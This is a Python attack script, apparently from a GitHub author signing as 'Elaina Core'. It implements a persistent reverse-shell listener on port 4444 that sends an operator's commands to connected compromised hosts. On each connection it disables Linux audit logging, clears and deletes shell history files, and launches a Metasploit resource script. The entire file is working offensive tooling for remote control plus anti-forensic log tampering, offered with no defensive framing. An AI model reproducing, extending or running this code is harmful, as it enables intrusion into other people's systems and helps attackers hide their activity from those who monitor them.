#!/usr/bin/env python3
# Elaina Core Persistent Reverse Shell Listener
# Signature: github.com/Yuri08loveElaina - Elaina Core

import socket
import os
import time
import json
import subprocess

SESSION_FILE = ".elaina_session.json"
PAYLOAD_FILE = "/opt/elaina_payload.rc"
LISTEN_PORT = 4444
HOST = "0.0.0.0"

def clear_logs_and_history():
    os.environ["HISTFILE"] = "/dev/null"
    subprocess.call(["sh", "-c", "unset HISTFILE; history -c"])
    subprocess.call(["sh", "-c", "auditctl -e 0 >/dev/null 2>&1 || true"])
    subprocess.call(["sh", "-c", "rm -f ~/.bash_history ~/.zsh_history >/dev/null 2>&1 || true"])

def save_session_info(addr):
    data = {
        "session_ip": addr[0],
        "session_port": addr[1],
        "timestamp": time.time()
    }
    with open(SESSION_FILE, "w") as f:
        json.dump(data, f)

def load_payload():
    if os.path.exists(PAYLOAD_FILE):
        print(f"[*] Loading metasploit payload: {PAYLOAD_FILE}")
        subprocess.Popen(["msfconsole", "-r", PAYLOAD_FILE])
    else:
        print("[i] Không có payload metasploit.")

def start_listener():
    print(f"[+] Listening on {HOST}:{LISTEN_PORT} (Elaina Core Persistent Mode)")
    while True:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((HOST, LISTEN_PORT))
            s.listen(1)
            conn, addr = s.accept()
            with conn:
                print(f"[✓] Connected from {addr[0]}:{addr[1]}")
                clear_logs_and_history()
                save_session_info(addr)
                load_payload()
                try:
                    while True:
                        cmd = input("shell> ")
                        if cmd.strip() in ["exit", "quit"]:
                            break
                        conn.sendall(cmd.encode() + b"\n")
                        data = conn.recv(4096)
                        print(data.decode(errors="ignore"), end="")
                except KeyboardInterrupt:
                    print("\n[*] Session closed.")

if __name__ == "__main__":
    try:
        start_listener()
    except Exception as e:
        print(f"[-] Error: {e}")
        time.sleep(3)
